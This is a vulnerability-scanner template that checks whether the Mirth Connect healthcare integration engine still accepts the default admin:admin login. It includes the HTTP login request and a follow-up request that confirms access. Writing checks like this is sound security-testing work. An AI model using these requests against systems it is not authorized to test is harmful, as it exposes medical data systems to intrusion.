# Nuclei Template: Mirth Connect - Default Admin Credentials
**Template ID:** mirth-connect-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`mirth-connect-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected Mirth Connect was using default credentials admin:admin. Mirth Connect is a widely used healthcare integration engine for HL7, FHIR, and other medical data standards.

## Steps to reproduce / Exploit Payload
```http
POST /api/users/_login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

username={{username}}&password={{password}}

GET /api/users/current HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
```

## References
- https://www.nextgen.com/products-and-services/integration-engine
- https://docs.nextgen.com/bundle/Mirth_Connect_v4.4.1/page/connect/connect/topics/c_Getting_Started_mirth_connect_ug.html
